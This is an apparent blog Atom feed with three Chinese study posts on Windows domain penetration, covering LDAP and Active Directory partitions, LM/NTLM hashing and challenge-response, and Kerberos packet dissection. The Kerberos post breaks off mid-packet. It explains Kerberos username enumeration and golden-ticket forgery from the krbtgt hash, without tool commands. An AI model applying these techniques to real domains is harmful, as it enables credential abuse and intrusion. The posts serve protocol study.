<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>青山</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-11-18T15:02:55.230Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>青山</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>内网渗透学习—LDAP协议</title>
    <link href="http://yoursite.com/2020/11/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E2%80%94LDAP%E5%8D%8F%E8%AE%AE/"/>
    <id>http://yoursite.com/2020/11/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E2%80%94LDAP%E5%8D%8F%E8%AE%AE/</id>
    <published>2020-11-17T09:43:22.994Z</published>
    <updated>2020-11-18T15:02:55.230Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LDAP协议"><a href="#LDAP协议" class="headerlink" title="LDAP协议"></a>LDAP协议</h1><p><em>LDAP</em>(Lightweight Directory Access Protocol)，轻量级目录访问协议，LDAP是一个设计来访问<strong><em>目录*</em></strong>数据库* 的协议</p><p>而一个<em>目录服务</em> 就是由一个<em>目录服务数据库</em> 加上一套访问协议组成的。对于域渗透来说，这一套组合就是<code>AD+LDAP</code></p><blockquote><p>一些名词</p><p>DC(domain component): 域名组件，表示从属于那个域</p><p>CN(Common Name):通用名，可辨别名</p><p>OU(Organizational Unit):组织单位，表示用户组</p></blockquote><h2 id="Active-Directory-活动目录"><a href="#Active-Directory-活动目录" class="headerlink" title="Active Directory 活动目录"></a>Active Directory 活动目录</h2><h3 id="目录服务器"><a href="#目录服务器" class="headerlink" title="目录服务器"></a>目录服务器</h3><p>目录服务器的特点</p><ul><li>树状结构组织数据，类似文件系统</li><li>特化查询、浏览、搜索的数据库。读能力强，写能力弱</li><li>必须要搭配 一个访问目录数据库的协议</li></ul><h3 id="Nameing-Context"><a href="#Nameing-Context" class="headerlink" title="Nameing Context"></a>Nameing Context</h3><p>  由于域林结构的复杂性，AD被设计得具有分布式特点。一个域林之中有多个域，一个域有多个域控，而每一台域控都有一个独立的AD，那么就有必要将数据隔离到多个分区中，如果不隔离的话，每个域控都要复制整个林环境的数据。分区之后域控就可以有选择的复制数据，而windows的就将AD划分成若干个分区，这些分区就是Nameing Context(命名上下文，简称NC)，每个NC都有自己的安全边界。</p><p>AD预定义了三个Nameing Context</p><ul><li>Configuration NC(配置NC)</li><li>Domian NC(域NC)</li><li>Schema NC(模式NC)</li></ul><h4 id="Configuration-NC"><a href="#Configuration-NC" class="headerlink" title="Configuration NC"></a>Configuration NC</h4><p>配置NC，域林的配置信息的主要储存数据库，包含有关站点，服务，分区和Active DirectorySchema 的信息，这个NC会被复制到每个域控的AD里。如<code>rookie.com</code>域林的配置NC就是<code>CN=Configuration,DC=rookie,DC=com</code>。</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20201117220602429.png" alt="image-20201117220602429"></p><h4 id="Domian-NC"><a href="#Domian-NC" class="headerlink" title="Domian NC"></a>Domian NC</h4><p>每一个域都有一个域NC，不同的域有不同的域NC，用于存储一些特定的与域相关的数据，其中包括该域内的所有计算机，所有用户的具体信息。有如下条目</p><p> <img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20201117224643073.png" alt="image-20201117224643073"></p><p><em>具体含义</em></p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20201117224737656.png" alt="image-20201117224737656"></p><h4 id="Schema-NC"><a href="#Schema-NC" class="headerlink" title="Schema NC"></a>Schema NC</h4><p>包含Schema信息，这个信息定义了AD中使用的类，对象和属性。</p><blockquote><p>LDAP中的类</p><p>域内所有条目都是一个类的实例。</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20201118202310400.png" alt="image-20201118202310400"></p><p>这就是AD之中的一个条目，这个条目是类Computer的实例，其中有什么属性就是有类Computer决定的。</p><p>可以在ObjectClass属性查看实例所有的相关类，包括这个条目对应的类和它的父类。</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20201118204140436.png" alt="image-20201118204140436"></p><p><em>类的继承关系是从上至下的</em></p><p>类有三种类型</p><ul><li><p>结构类（Structural）</p><p>结构类规定了对象实例的基本属性，每个条目属于且仅属于一个结构型对象类。前面说过域内每个条目都是类的实例，这个类必须是结构类。只有结构类才有实例。比如说前面说过的Computer类。</p></li><li><p>抽象类(Abstract)</p><p>抽象类型是结构类或其他抽象类的父类，它将对象属性中公共的部分组织在一起。跟面对对象里面的抽象方法一样，他没有实例，只能充当结构类或者抽象类的父类。比如说top 类。注意抽象类只能从另一个抽象类继承。</p></li><li><p>辅助类(Auxiliary）</p><p>辅助类型规定了对象实体的扩展属性。虽然每个条目只属于一个结构型对象类，但可以同时属于多个辅助型对象类。注意辅助类不能从结构类继承</p></li></ul></blockquote><p>Schema NC里面的条目是所有类的实例。那么既然是实例，那么这些类条目也是拥有对应的类的，主要有classSchema、attributeSchema等</p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20201118222649251.png" alt="image-20201118222649251"></p><p><a href="https://daiker.gitbook.io/windows-protocol/ldap-pian" target="_blank" rel="noopener">参考文章</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;LDAP协议&quot;&gt;&lt;a href=&quot;#LDAP协议&quot; class=&quot;headerlink&quot; title=&quot;LDAP协议&quot;&gt;&lt;/a&gt;LDAP协议&lt;/h1&gt;&lt;p&gt;&lt;em&gt;LDAP&lt;/em&gt;(Lightweight Directory Access Protocol)，轻
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>域渗透学习—NTML协议基础</title>
    <link href="http://yoursite.com/2020/11/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E2%80%94NTML%E5%8D%8F%E8%AE%AE/"/>
    <id>http://yoursite.com/2020/11/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E2%80%94NTML%E5%8D%8F%E8%AE%AE/</id>
    <published>2020-11-12T11:58:48.107Z</published>
    <updated>2020-11-12T12:26:03.688Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NTML协议"><a href="#NTML协议" class="headerlink" title="NTML协议"></a>NTML协议</h1><h2 id="LM-Hash-amp-NTML-Hash"><a href="#LM-Hash-amp-NTML-Hash" class="headerlink" title="LM Hash&amp;NTML Hash"></a>LM Hash&amp;NTML Hash</h2><p>windows内部是不保存明文密码的，只保存密码的hash值</p><blockquote><p>本机的用户密码hash是放在本地的SAM文件里面，域内用户的密码hash存在域控的NTDS.DIT文件的。</p></blockquote><p>windows密码hash保存模式，类似如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br></pre></td></tr></table></figure><p><code>AAD3B435B51404EEAAD3B435B51404EE</code>是<code>LM hash</code></p><p><code>31D6CFE0D16AE931B73C59D7E0C089C0</code>是<code>NTML hash</code></p><h3 id="LM-hash-LAN-Manager-Hash-老密码"><a href="#LM-hash-LAN-Manager-Hash-老密码" class="headerlink" title="LM hash (LAN Manager Hash) 老密码"></a>LM hash (LAN Manager Hash) 老密码</h3><p><em>LM Hash 的算法</em></p><ol><li>将用户密码转化为大写，再将转化后的密码转化成十六进制字符串，不足14字节将会使用0再末尾补全。</li><li>上一步得到的十六进制字符串分成两个7byte的部分，每部分转化成byte流，长度为56bit，长度不足的使用0在左边补齐。</li><li>再分为7bit一组，每组末尾加0，凑足8bit，重新组回两组。</li><li>上步骤得到的二组，分别作为Key对<code>KGS!@#$%</code>进行DES加密。</li><li>加密后的两组拼接到一起，得到最终的LM Hash</li></ol><p><em>LM Hash的一些弊端</em></p><ul><li>密码方面的限制<ul><li>密码长度最大只能为14个字符</li><li>密码不区分大小写</li></ul></li><li>加密过程中的一些漏洞<ul><li>如果密文的后半部分是<code>aad3b435b51404ee</code>，那么就意味着，这个密码的长度是小于等于7位的，密码强度大大减少</li><li>des密码强度并不高</li></ul></li></ul><h3 id="NTLM-hash"><a href="#NTLM-hash" class="headerlink" title="NTLM hash"></a>NTLM hash</h3><p><em>NTLM hash 的算法</em></p><ol><li>将用户的密码转化成16进制形式</li><li>把转化成16进制的密码进行unicode编码</li><li>使用MD4摘要算法对上一步得到的unicode编码进行hash计算</li></ol><p><em>NTLM hash本地的认证</em></p><p>当用户注销、重启、锁屏之后，windows会让<strong><em>winlogon</em></strong>显示登陆界面，接收用户的输入之后，会将将密码交付给<strong><em>lsass</em></strong>进程，这个进程会将明文密码加密成NTLM hash，再与<strong><em>SAM数据库</em></strong>里对应的用户密码做对比。</p><blockquote><ul><li><p>winlogon(Windows logon process)windows注册进程：是windows NT 用户的登陆程序，用于管理用户的登陆与退出</p></li><li><p>lsass( Local Security Authority Service): 用于本地安全与登陆策略</p></li><li><p>SAM(Security Account Manager 安全账户管理)：windows采用的账户管理策略，这个策略会将本地组的用户的账户和hash加密之后保存到SAM数据库中，SAM数据库文件路径是<code>%systemroot%\system32\config\SAM</code>文件</p></li></ul></blockquote><h2 id="NTLM-身份验证机制"><a href="#NTLM-身份验证机制" class="headerlink" title="NTLM 身份验证机制"></a>NTLM 身份验证机制</h2><p>NTLM 身份验证采用的是 <code>Challenge(挑战)/Response(响应)</code>验证机制，有三步组成：协商，质询，身份验证</p><p><strong><em>客户机与服务器的交互过程示意图(域控不参加的情况)</em></strong></p><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20201111174315667.png" alt="image-20201111174315667"></p><ul><li>协商：Client会发送一个带有用户信息(用户名)和服务器请求的功能列表</li><li>质询：Server对Client发出的<strong><em>协商</em></strong> 做出回应，返回的内容包含服务器同意并且支持的功能列表，更重要的是包含了服务器产生的<code>challenge</code></li><li>身份验证：Client对Server返回的<strong><em>质询</em></strong> 做出回应，使用根具输入的密码生成的<code>NTMLM hash</code>和<strong><em>质询</em></strong> 中的<code>challenge</code>进行加密运算得到<strong><em>response</em></strong>，然后将<strong><em>response</em></strong>、用户名、<strong><em>challenge</em></strong>一起返回给Server</li></ul><blockquote><p>关于challenge：服务端生成的一个随机字符用于验证Client的身份，NTLM v1中为8位，NTLM v2中为16位</p><p>关于Net-NTML hash：基于用户hash经过一定算法产生的。</p><p>关于response：本质上就是一个<code>net-NTLM hash</code></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;NTML协议&quot;&gt;&lt;a href=&quot;#NTML协议&quot; class=&quot;headerlink&quot; title=&quot;NTML协议&quot;&gt;&lt;/a&gt;NTML协议&lt;/h1&gt;&lt;h2 id=&quot;LM-Hash-amp-NTML-Hash&quot;&gt;&lt;a href=&quot;#LM-Hash-amp-NTML
      
    
    </summary>
    
    
    
      <category term="windows认证协议" scheme="http://yoursite.com/tags/windows%E8%AE%A4%E8%AF%81%E5%8D%8F%E8%AE%AE/"/>
    
      <category term="域渗透基础" scheme="http://yoursite.com/tags/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>域渗透学习—kerberos协议</title>
    <link href="http://yoursite.com/2020/11/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E2%80%94kerberos%E5%8D%8F%E8%AE%AE/"/>
    <id>http://yoursite.com/2020/11/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E2%80%94kerberos%E5%8D%8F%E8%AE%AE/</id>
    <published>2020-11-12T11:58:48.104Z</published>
    <updated>2020-11-12T12:26:17.903Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网渗透学习—kerberos协议"><a href="#内网渗透学习—kerberos协议" class="headerlink" title="内网渗透学习—kerberos协议"></a>内网渗透学习—kerberos协议</h1><h4 id="kerberos协议中的角色与简单流程"><a href="#kerberos协议中的角色与简单流程" class="headerlink" title="kerberos协议中的角色与简单流程"></a>kerberos协议中的角色与简单流程</h4><p>Kerberos是一种由MIT（麻省理工大学）提出的一种网络身份验证协议。它旨在通过使用密钥加密技术为客户端/服务器应用程序提供强身份验证。</p><p>在kerberos协议之中主要是有三个角色存在：</p><ul><li>Client(用户)：发出访问服务的角色</li><li>Server(服务)：提供服务的角色</li><li>KDC(Key Distribution Center)密钥分发中心：分发密钥的角色</li></ul><p>在一个域林之中，KDC服务默认会安装在域控之中，而client和server是域内的用户或者服务。在kerberos认证过程中client是否有权限访问server的服务就由KDC发放的票据决定</p><p><strong><em>简化的Kerberos认证流程图</em></strong></p><blockquote><p>名词概念</p><p>AD(Account Datebase)：账户数据库</p><p>Master Key： 用户密码的一种hash值</p><p>Ticket(票据)：域网络对象相互访问的凭证</p><p>TGT(Ticket Granting Ticket 票据授予票据)：用于向KDC获取服务票据的凭证</p><p>TGS(Silver Ticket 服务票据)：用于向Server请求服务的凭证</p><p>Authentication Service(身份认证服务)：认证Client 的身份，并为其发放TGT的服务，是KDC的一部分</p><p>Ticket Granting Service(票据发放服务)：检验Client发来的TGT，并为其生成某个Server的TGS,是KDC的一部分。</p></blockquote><p><img src="https://my-blog-rookie.oss-cn-beijing.aliyuncs.com/img/image-20201106001335990.png" alt="image-20201106001335990"></p><ol><li>AS_REQ(认证服务请求)：Client向KDC发送AS_REQ，请求的凭据是Client的hash(这个hash是根据输入的密码生成的)加密的时间戳。</li><li>AS_REP(认证服务响应)：KDC向发出AS_REQ的Client发出响应，去如果认证成功就返回一个TGT</li><li>TGS_REQ(票据发放服务请求)：Client凭借TGT向KDC发送对某一Server的TGS_REQ</li><li>TGS_REP(票据发放服务响应)：KDC验证TGT，如果验证正确就根据请求的服务返回对应的TGS,不管是否有权向访问Server</li><li>AP_REQ(服务请求)：Client凭借TGS向Server发起服务请求</li><li>AP_REP(服务响应)：Server验证TGS，如果验证正确就向KDC询问，Client是否有权限获得服务，如果有就返回响应</li></ol><h2 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS_REQ"></a>AS_REQ</h2><h4 id="数据包结构拆解"><a href="#数据包结构拆解" class="headerlink" title="数据包结构拆解"></a><strong><em>数据包结构拆解</em></strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">Kerberos</span><br><span class="line">    Record Mark: 294 bytes</span><br><span class="line">        0... .... .... .... .... .... .... .... &#x3D; Reserved: Not set</span><br><span class="line">        .000 0000 0000 0000 0000 0001 0010 0110 &#x3D; Record Length: 294</span><br><span class="line">    as-req</span><br><span class="line">        pvno: 5</span><br><span class="line">        msg-type: krb-as-req (10)</span><br><span class="line">        padata: 2 items</span><br><span class="line">            PA-DATA PA-ENC-TIMESTAMP</span><br><span class="line">                padata-type: kRB5-PADATA-ENC-TIMESTAMP (2)</span><br><span class="line">                    padata-value: 3041a003020112a23a04384e3857102e1da38ea37695b42c…</span><br><span class="line">                        etype: eTYPE-AES256-CTS-HMAC-SHA1-96 (18)</span><br><span class="line">                        cipher: 4e3857102e1da38ea37695b42cc877f2dfbc29a67c6c8f21…</span><br><span class="line">            PA-DATA PA-PAC-REQUEST</span><br><span class="line">                padata-type: kRB5-PADATA-PA-PAC-REQUEST (128)</span><br><span class="line">                    padata-value: 3005a0030101ff</span><br><span class="line">                        include-pac: True</span><br><span class="line">        req-body</span><br><span class="line">            Padding: 0</span><br><span class="line">            kdc-options: 40810010</span><br><span class="line">                0... .... &#x3D; reserved: False</span><br><span class="line">                .1.. .... &#x3D; forwardable: True</span><br><span class="line">                ..0. .... &#x3D; forwarded: False</span><br><span class="line">                ...0 .... &#x3D; proxiable: False</span><br><span class="line">                .... 0... &#x3D; proxy: False</span><br><span class="line">                .... .0.. &#x3D; allow-postdate: False</span><br><span class="line">                .... ..0. &#x3D; postdated: False</span><br><span class="line">                .... ...0 &#x3D; unused7: False</span><br><span class="line">                1... .... &#x3D; renewable: True</span><br><span class="line">                .0.. .... &#x3D; unused9: False</span><br><span class="line">                ..0. .... &#x3D; unused10: False</span><br><span class="line">                ...0 .... &#x3D; opt-hardware-auth: False</span><br><span class="line">                .... 0... &#x3D; unused12: False</span><br><span class="line">                .... .0.. &#x3D; unused13: False</span><br><span class="line">                .... ..0. &#x3D; constrained-delegation: False</span><br><span class="line">                .... ...1 &#x3D; canonicalize: True</span><br><span class="line">                0... .... &#x3D; request-anonymous: False</span><br><span class="line">                .0.. .... &#x3D; unused17: False</span><br><span class="line">                ..0. .... &#x3D; unused18: False</span><br><span class="line">                ...0 .... &#x3D; unused19: False</span><br><span class="line">                .... 0... &#x3D; unused20: False</span><br><span class="line">                .... .0.. &#x3D; unused21: False</span><br><span class="line">                .... ..0. &#x3D; unused22: False</span><br><span class="line">                .... ...0 &#x3D; unused23: False</span><br><span class="line">                0... .... &#x3D; unused24: False</span><br><span class="line">                .0.. .... &#x3D; unused25: False</span><br><span class="line">                ..0. .... &#x3D; disable-transited-check: False</span><br><span class="line">                ...1 .... &#x3D; renewable-ok: True</span><br><span class="line">                .... 0... &#x3D; enc-tkt-in-skey: False</span><br><span class="line">                .... .0.. &#x3D; unused29: False</span><br><span class="line">                .... ..0. &#x3D; renew: False</span><br><span class="line">                .... ...0 &#x3D; validate: False</span><br><span class="line">            cname</span><br><span class="line">                name-type: kRB5-NT-PRINCIPAL (1)</span><br><span class="line">                cname-string: 1 item</span><br><span class="line">                    CNameString: testuser</span><br><span class="line">            realm: HACKE</span><br><span class="line">            sname</span><br><span class="line">                name-type: kRB5-NT-SRV-INST (2)</span><br><span class="line">                sname-string: 2 items</span><br><span class="line">                    SNameString: krbtgt</span><br><span class="line">                    SNameString: HACKE</span><br><span class="line">            till: 2037-09-13 02:48:05 (UTC)</span><br><span class="line">            rtime: 2037-09-13 02:48:05 (UTC)</span><br><span class="line">            nonce: 19228112</span><br><span class="line">            etype: 6 items</span><br><span class="line">                ENCTYPE: eTYPE-AES256-CTS-HMAC-SHA1-96 (18)</span><br><span class="line">                ENCTYPE: eTYPE-AES128-CTS-HMAC-SHA1-96 (17)</span><br><span class="line">                ENCTYPE: eTYPE-ARCFOUR-HMAC-MD5 (23)</span><br><span class="line">                ENCTYPE: eTYPE-ARCFOUR-HMAC-MD5-56 (24)</span><br><span class="line">                ENCTYPE: eTYPE-ARCFOUR-HMAC-OLD-EXP (-135)</span><br><span class="line">                ENCTYPE: eTYPE-DES-CBC-MD5 (3)</span><br><span class="line">            addresses: 1 item WIN10-X64-TEST&lt;20&gt;</span><br><span class="line">                HostAddress WIN10-X64-TEST&lt;20&gt;</span><br><span class="line">                    addr-type: nETBIOS (20)</span><br><span class="line">                    NetBIOS Name: WIN10-X64-TEST&lt;20&gt; (Server service)</span><br></pre></td></tr></table></figure><ul><li>pvno </li></ul><p>kerberos版本号</p><ul><li>msg-type</li></ul><p>windows消息类型，AS_REQ的自然是krb-as-req</p><ul><li>padata(pre-authentication data 预认证数据)</li></ul><p>是一些认证信息，是一个列表，内部有若干个认证消息，每一个认证消息有type和value。</p><p>具体可看：<a href="https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+PA-DATA" target="_blank" rel="noopener">Kerberos PA-DATA</a></p><ul><li><p>req-body</p><ul><li>kdc-options</li></ul><p>这是一些KDC的option开启情况，属于一种标识位。       <a href="https://web.mit.edu/kerberos/krb5-1.12/doc/admin/conf_files/kdc_conf.html" target="_blank" rel="noopener">mit文档</a></p><ul><li>cname</li></ul><p>这是Client的主机名，采用的是PrincipalName 类型和string类型的组合。sname也是采用这种格式</p><blockquote><p>PrincipalName 类型</p><p>KRB_NT_PRINCIPAL  用户主体名称类型</p><p>KRB_NT_SRV-INST     服务和其他唯一实例(krbtgt)的名称类型</p><p>KRB_NT_SRV_HST      服务主机名称为实例名的名称类型</p><p>KRB_NT_SRV_XHST    服务与主机作为剩余组件名称类型</p><p>KRB_NT_UID               唯一ID名称类型</p><p>KRB_NT_UNKNOWN  未知名称类型</p></blockquote><ul><li>realm</li></ul><p>服务端域名</p><ul><li>sname</li></ul><p>这是是服务端的身份和所属域，注意在AS_REQ中服务端指的是提供AS的KDC，所以正常的sname-string字段的值就应该是krbtgt和其所属域.</p><ul><li>till</li></ul><p>到期时间</p><ul><li>etype</li></ul><p>加密类型,在请求报文之中每个有加密的数据都有一个etype字段对应,KDC就是从这段数据中加密方式,来从AD之中选择对应的hash来进行身份验证</p><ul><li>addresses</li></ul><p>地址相关信息@</p></li></ul><h4 id="KDC接收AS-REQ的行为"><a href="#KDC接收AS-REQ的行为" class="headerlink" title="KDC接收AS_REQ的行为"></a>KDC接收AS_REQ的行为</h4><blockquote><p>两个重要的padata(pre-authentication data 预认证数据)</p></blockquote><blockquote><p>PA-ENC-TIMESTAMP</p><p>这个预认证数据是Client用自己的<code>Master key</code>加密时间戳得到的一串字符, AS拿到这个段数据之后就会根据etype去AD里面寻找对应的用户hash(用户名取自cname),并使用这个hash解密时间戳, 如果解密成功, 并且时间戳在一定范围之内,则这个预认证数据通过.</p></blockquote><blockquote><p>PA-PAC-REQUEST</p><p>这个预认证数据是关于微软的一个扩展—PAC, 这个扩展的基本作用就是为kerberos添加”权限认证”的能力. 开启这项扩展,AS完成时间戳的认证之后就会将PAC(内部包涵Client的sid和所在组)放TGT的认证数据之中, 一起返回给Client, PAC关系到之后Server判断Client是否有权限访问服务</p></blockquote><h2 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS_REP"></a>AS_REP</h2><p><strong><em>拆解数据包</em></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Kerberos</span><br><span class="line">    Record Mark: 1550 bytes</span><br><span class="line">        0... .... .... .... .... .... .... .... &#x3D; Reserved: Not set</span><br><span class="line">        .000 0000 0000 0000 0000 0110 0000 1110 &#x3D; Record Length: 1550</span><br><span class="line">    as-rep</span><br><span class="line">        pvno: 5</span><br><span class="line">        msg-type: krb-as-rep (11)</span><br><span class="line">        padata: 1 item</span><br><span class="line">            PA-DATA PA-ENCTYPE-INFO2</span><br><span class="line">                padata-type: kRB5-PADATA-ETYPE-INFO2 (19)</span><br><span class="line">                    padata-value: 3020301ea003020112a1171b154841434b452e544553544c…</span><br><span class="line">                        ETYPE-INFO2-ENTRY</span><br><span class="line">                            etype: eTYPE-AES256-CTS-HMAC-SHA1-96 (18)</span><br><span class="line">                            salt: HACKE.TESTLABtestuser</span><br><span class="line">        crealm: HACKE.TESTLAB</span><br><span class="line">        cname</span><br><span class="line">            name-type: kRB5-NT-PRINCIPAL (1)</span><br><span class="line">            cname-string: 1 item</span><br><span class="line">                CNameString: testuser</span><br><span class="line">        ticket</span><br><span class="line">            tkt-vno: 5</span><br><span class="line">            realm: HACKE.TESTLAB</span><br><span class="line">            sname</span><br><span class="line">                name-type: kRB5-NT-SRV-INST (2)</span><br><span class="line">                sname-string: 2 items</span><br><span class="line">                    SNameString: krbtgt</span><br><span class="line">                    SNameString: HACKE.TESTLAB</span><br><span class="line">            enc-part</span><br><span class="line">                etype: eTYPE-AES256-CTS-HMAC-SHA1-96 (18)</span><br><span class="line">                kvno: 2</span><br><span class="line">                cipher: 07b5d35de5b1ac006b831ff508a5ced14a010563418fd736…</span><br><span class="line">        enc-part</span><br><span class="line">            etype: eTYPE-AES256-CTS-HMAC-SHA1-96 (18)</span><br><span class="line">            kvno: 4</span><br><span class="line">            cipher: 70246fe54be2b6395f20dc6845b970d16bb3319ab304e3bb…</span><br></pre></td></tr></table></figure><p>主要关注与AS_REQ不同的点</p><ul><li><p>ticket</p><p>这就是AS派发的TGT票据，内部所有密文的密钥都是<code>krbtgt</code>的<code>NTLM hash</code>，如果能拿到<code>krbtgt</code>的<code>NTLM hash</code>我们既可以伪造TGT，这就是<code>黄金票据</code></p><ul><li><p>tkt-vno</p><p>票据版本</p></li><li><p>realm</p><p>派发票据的KDC的所属域</p></li><li><p>sname</p><p>派发票据的角色再KDC的身份，一般是<code>kbrtgt</code></p></li><li><p>enc-part</p><p>使用<code>kbrtgt</code>的<code>NTLM hash</code>作为密钥生成的TGT主体                                                                                                                        </p></li></ul></li><li><p>enc-part</p><p>这部分是使用Client的hash为key加密<code>Session key</code>得到的，主要用于作为下阶段(TGS阶段)的认证密钥。</p></li></ul><h3 id="AS阶段的安全问题"><a href="#AS阶段的安全问题" class="headerlink" title="AS阶段的安全问题"></a>AS阶段的安全问题</h3><h4 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h4><p>在AS认证截断，用户名存在和密码错误的响应报文错误码不同，</p><ul><li><p>用户名不存在的响应错误码是<code>6:KDC_ERR_C_PRINCIPAL_UNKNOWN 未知的主机名</code></p></li><li><p>密码错误，用户名存在的响应错误码是<code>24:KDC_ERR_PREAUTH_PAILED 预认证失败</code></p></li></ul><p>通过这个比较AS_REP里的错误码就可实行 <strong><em>用户名枚举</em></strong>  .</p><h4 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h4><p>AS_ERP里的tikcet的encpart是使用<code>kbrtgt</code>的<code>NTLM hash</code>为<code>key</code>加密而成的,所以只要拿到了<code>kbrtgt</code>的<code>NTLM hash</code>就可以伪造TGT，这个伪造出来的票据就叫做 <strong><em>黄金票据</em></strong></p><h2 id="TGS-REQ"><a href="#TGS-REQ" class="headerlink" title="TGS_REQ"></a>TGS_REQ</h2><p><strong><em>拆解数据包</em></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">Frame 40: 62 